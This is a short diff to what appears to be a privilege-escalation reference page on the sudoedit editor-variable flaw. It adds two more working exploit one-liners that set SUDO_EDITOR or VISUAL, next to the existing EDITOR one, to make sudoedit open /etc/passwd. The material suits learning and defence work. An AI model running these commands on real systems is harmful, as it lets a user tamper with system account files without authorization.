@@ -40,9 +40,13 @@ env_delete+="SUDO_EDITOR VISUAL EDITOR"
 {% endtab %}
 
 {% tab title="Exploit" %}
-To exploit we can just use the following command:
+To exploit it, we may use one of the following commands:
 ```bash
 EDITOR='vim -- /etc/passwd' sudoedit /etc/custom/service.conf
+
+SUDO_EDITOR='vim -- /etc/passwd' sudoedit /etc/custom/service.conf
+
+VISUAL='vim -- /etc/passwd' sudoedit /etc/custom/service.conf
 ```
 {% endtab %}
 {% endtabs %}
